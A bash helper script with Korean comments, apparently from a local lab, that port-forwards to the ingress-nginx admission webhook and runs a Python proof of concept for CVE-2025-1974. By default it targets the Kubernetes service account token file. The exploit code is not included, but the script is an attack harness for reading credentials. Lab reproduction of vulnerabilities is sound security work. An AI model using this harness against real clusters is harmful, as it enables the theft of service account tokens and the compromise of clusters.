#!/usr/bin/env bash
# stage3_run.sh — CVE-2025-1974 PoC 실행 헬퍼
# port-forward를 백그라운드로 열고 PoC를 실행한 뒤 정리한다.
set -euo pipefail

export PATH="$HOME/.local/bin:$PATH"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_ROOT="$(dirname "$SCRIPT_DIR")"
POC_SCRIPT="$LAB_ROOT/poc/cve_2025_1974_poc.py"
PF_PID_FILE="${PF_PID_FILE:-/tmp/poc_portforward.pid}"
PF_LOG_FILE="${PF_LOG_FILE:-/tmp/poc_portforward.log}"
WEBHOOK_PORT="${WEBHOOK_PORT:-8443}"
PF_READY_TIMEOUT="${PF_READY_TIMEOUT:-30}"
STEP="${1:-all}"        # 인자: 1 | 2 | 3 | all | --diagnose-port-forward
TARGET_FILE="${2:-/var/run/secrets/kubernetes.io/serviceaccount/token}"
DIAGNOSE_PORT_FORWARD=false

if [[ "$STEP" == "--diagnose-port-forward" || "$STEP" == "diagnose-port-forward" ]]; then
    DIAGNOSE_PORT_FORWARD=true
    STEP="diagnose-port-forward"
fi

_info() { echo "[INFO]  $*"; }
_ok()   { echo "[OK]    $*"; }
_warn() { echo "[WARN]  $*"; }
_die()  { echo "[ERROR] $*" >&2; exit 1; }

cleanup() {
    if [[ -f "$PF_PID_FILE" ]]; then
        local pid
        pid="$(cat "$PF_PID_FILE" 2>/dev/null || true)"
        if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
            kill "$pid" 2>/dev/null || true
            wait "$pid" 2>/dev/null || true
        fi
        rm -f "$PF_PID_FILE"
        _info "port-forward 종료"
    fi
}
trap cleanup EXIT

log_tail() {
    if [[ -f "$PF_LOG_FILE" ]]; then
        tail -n 40 "$PF_LOG_FILE"
    else
        echo "(port-forward log not found: ${PF_LOG_FILE})"
    fi
}

wait_for_pid_exit() {
    local pid="$1"
    local i
    for i in $(seq 1 5); do
        kill -0 "$pid" 2>/dev/null || return 0
        sleep 1
    done
    return 1
}

kill_stale_port_forward() {
    local old_pid
    if [[ -f "$PF_PID_FILE" ]]; then
        old_pid="$(cat "$PF_PID_FILE" 2>/dev/null || true)"
        if [[ -n "$old_pid" ]] && kill -0 "$old_pid" 2>/dev/null; then
            _warn "기존 port-forward PID 종료: ${old_pid}"
            kill "$old_pid" 2>/dev/null || true
            wait_for_pid_exit "$old_pid" || kill -9 "$old_pid" 2>/dev/null || true
        fi
        rm -f "$PF_PID_FILE"
    fi

    if command -v pgrep >/dev/null 2>&1; then
        while IFS= read -r old_pid; do
            [[ -z "$old_pid" ]] && continue
            _warn "stale kubectl port-forward 종료: PID ${old_pid}"
            kill "$old_pid" 2>/dev/null || true
            wait_for_pid_exit "$old_pid" || kill -9 "$old_pid" 2>/dev/null || true
        done < <(
            pgrep -f "kubectl .*port-forward .*ingress-nginx-controller-admission.*${WEBHOOK_PORT}:443" 2>/dev/null || true
        )
    fi
}

local_port_ready() {
    if command -v nc >/dev/null 2>&1 && nc -z 127.0.0.1 "$WEBHOOK_PORT" >/dev/null 2>&1; then
        return 0
    fi
    if command -v lsof >/dev/null 2>&1 \
        && lsof -nP -iTCP:"$WEBHOOK_PORT" -sTCP:LISTEN 2>/dev/null | grep -q LISTEN; then
        return 0
    fi
    if [[ -f "$PF_LOG_FILE" ]] && grep -Eq "Forwarding from (127\\.0\\.0\\.1|\\[::1\\]):${WEBHOOK_PORT}" "$PF_LOG_FILE"; then
        return 0
    fi
    return 1
}

wait_for_port_forward_ready() {
    local pid="$1"
    local i
    for i in $(seq 1 "$PF_READY_TIMEOUT"); do
        if local_port_ready; then
            _ok "port-forward 준비됨 (port ${WEBHOOK_PORT}, pid ${pid})"
            return 0
        fi
        if ! kill -0 "$pid" 2>/dev/null; then
            _die "port-forward 프로세스가 준비 전에 종료됨. 로그: $(log_tail)"
        fi
        if [[ -f "$PF_LOG_FILE" ]] && grep -Eqi "address already in use|unable to listen|error forwarding" "$PF_LOG_FILE"; then
            _die "port-forward 오류 감지. 로그: $(log_tail)"
        fi
        sleep 1
    done
    _die "port-forward 준비 시간 초과 (${PF_READY_TIMEOUT}s). 로그: $(log_tail)"
}

# ── 사전 확인 ─────────────────────────────────────────────────────────────────
command -v kubectl >/dev/null || _die "kubectl 없음. PATH 확인: export PATH=\$HOME/.local/bin:\$PATH"
command -v python3 >/dev/null || _die "python3 없음"
mkdir -p "$(dirname "$PF_LOG_FILE")" "$(dirname "$PF_PID_FILE")"

_info "클러스터 상태 확인..."
kubectl get pods -n ingress-nginx -l app.kubernetes.io/component=controller \
    --field-selector=status.phase=Running -o name | grep -q pod \
    || _die "ingress-nginx controller Pod가 Running 상태가 아님. 'make cluster-up' 실행 필요"

# ── port-forward 시작 ─────────────────────────────────────────────────────────
kill_stale_port_forward
: >"${PF_LOG_FILE}"
_info "port-forward 시작: localhost:${WEBHOOK_PORT} → webhook:443"
kubectl port-forward svc/ingress-nginx-controller-admission \
    "${WEBHOOK_PORT}:443" -n ingress-nginx \
    >"${PF_LOG_FILE}" 2>&1 &
echo $! > "$PF_PID_FILE"

wait_for_port_forward_ready "$(cat "$PF_PID_FILE")"

if [[ "$DIAGNOSE_PORT_FORWARD" == "true" ]]; then
    _ok "diagnostic mode: port-forward readiness 확인 완료"
    exit 0
fi

# ── PoC 실행 ─────────────────────────────────────────────────────────────────
_info "PoC 실행 (step=${STEP}, file=${TARGET_FILE})"
python3 "$POC_SCRIPT" \
    --target "https://127.0.0.1:${WEBHOOK_PORT}" \
    --step "$STEP" \
    --file "$TARGET_FILE"
